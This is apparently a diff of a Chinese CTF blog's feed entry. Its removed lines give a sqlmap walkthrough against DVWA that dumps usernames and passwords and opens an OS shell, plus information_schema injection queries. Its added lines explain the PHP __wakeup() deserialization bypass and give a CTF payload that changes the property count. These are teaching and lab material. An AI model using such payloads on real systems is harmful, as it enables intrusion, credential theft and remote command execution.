+<p>PHP魔术方法_ wakeup()是在反序列化操作中起作用的魔法函数， 当unserialize的时候， 会检查时候存在 __ wakeup()函数, 如果存在的话，会优先调用__wakeup()函数。 </p>
+<p>而<strong>wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么就调用</strong>wakeup()函数, 如果该数字大于真实属性个数，就会绕过__wakeup()函数。</p>
+<p>serialize()函数：用于序列化对象或数组，并返回一个字符串。序列化对象后， 可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</p>
+<p>unserialize()函数：用于将通过serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。</p>
+<p>举例说明</p>
+<div class="hljs"><pre><code>&lt;?php
+class Student{
+public $full_name = &apos;zhangsan&apos;;
+public $score = 150;
+public $grades = array();
 
-<p>第一步:</p>
-<div class="hljs"><pre><code>-u &quot;xx” --cookie= &quot;yyy&quot; //带上cookie对URL进行注入探测</code></pre></div><p>第二步:</p>
-<div class="hljs"><pre><code>-u &quot;xxx” --cookie= &quot;yy&quot; - current--db //对数据库名进行获取</code></pre></div><p>第三步:</p>
-<div class="hljs"><pre><code>-u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //对数据库dvwa的表名进行枚举</code></pre></div><p>第四步:</p>
-<div class="hljs"><pre><code>-u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //对dvwa库里面的名为users表的列名进行枚举</code></pre></div><p>第五步:</p>
-<div class="hljs"><pre><code>-u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump
-//探测user表name和password字段</code></pre></div><p>如果此时得到的密码为密文, SQLmap会自动询问，是否爆破,选择”是”即可开始使用SQLMAP自带的字<br>典进行爆破。</p>
-<p>第六步:</p>
-<div class="hljs"><pre><code>-u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //获取shell,选择后台语言</code></pre></div><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>order by * </p>
-<p>group by *</p>
-<p>利用内置函数暴数据库信息</p>
-<p>version() 查看数据库版本</p>
-<p>database() 查看当前数据库名</p>
-<p>user() 查看当前用户</p>
-<p>查看表：</p>
-<div class="hljs"><pre><code>Select  TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()  </code></pre></div><p>可十六进制查看字段：</p>
-<div class="hljs"><pre><code>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;</code></pre></div>]]></content>
+function __wakeup() {
+echo &quot;__wakeup is invoked&quot;;
+}
+}
+
+$s = new Student();
+var_dump(serialize($s));
+?&gt;</code></pre></div><hr>
+<div class="hljs"><pre><code>O:7:&quot;Student&quot;:3:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}</code></pre></div><p>各个符号的含义<br><strong>变量类型：类名长度（字节）：类名：属性数量：{属性名类型：属性名长度：属性名：属性值类型：属性值长度：属性值内容}</strong></p>
+<p>其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。<br>wakeup()漏洞就是与整个属性个数值有关。<strong>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。</strong></p>
+<p>当我们将上述的序列化的字符串中的对象属性个数修改为5，变为<br>O:7:”Student”:5:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}</p>
+<p>最后执行运行的代码如下:</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span></span>&#123;
+<span class="hljs-keyword">public</span> $full_name = <span class="hljs-string">'zhangsan'</span>;
+<span class="hljs-keyword">public</span> $score = <span class="hljs-number">150</span>;
+<span class="hljs-keyword">public</span> $grades = <span class="hljs-keyword">array</span>();
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span> </span>&#123;
+<span class="hljs-keyword">echo</span> <span class="hljs-string">"__wakeup is invoked"</span>;
+&#125;
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;
+var_dump(<span class="hljs-keyword">$this</span>);
+&#125;
+&#125;
+
+$s = <span class="hljs-keyword">new</span> Student();
+$stu = unserialize(<span class="hljs-string">'O:7:"Student":5:&#123;s:9:"full_name";s:8:"zhangsan";s:5:"score";i:150;s:6:"grades";a:0:&#123;&#125;&#125;'</span>);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+
+<h2 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h2><p>题目</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;
+<span class="hljs-keyword">public</span> $flag = <span class="hljs-string">'111'</span>;
+<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>&#123;
+<span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);
+&#125;
+?code=</code></pre></div>
+
+<hr>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;  <span class="hljs-comment">//定义一个名为xctf的类</span>
+<span class="hljs-keyword">public</span> $flag = <span class="hljs-string">'111'</span>;<span class="hljs-comment">//定义一个公有的类属性$flag，值为111</span>
+<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-comment">//定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本</span>
+<span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);
+&#125;
+&#125;
+$test = <span class="hljs-keyword">new</span> xctf();   <span class="hljs-comment">//使用new运算符来实例化该类（xctf）的对象为test</span>
+<span class="hljs-keyword">echo</span>(serialize($test));   <span class="hljs-comment">//输出被序列化的对象（test）</span>
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+<p>输出结果</p>
+<div class="hljs"><pre><code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></pre></div><p>我们要反序列化xctf类的同时还要绕过wakeup方法的执行（如果不绕过wakeup()方法，那么将会输出bad requests并退出脚本），wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。因此，需要修改序列化字符串中的属性个数：<br>当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即如下所示：</p>
+<div class="hljs"><pre><code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></pre></div><p>访问url?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
+]]></content>
       <categories>
         <category>ctf</category>
       </categories>
       <tags>
-        <tag>sql</tag>
+        <tag>unserialize</tag>
       </tags>
   </entry>
   <entry>
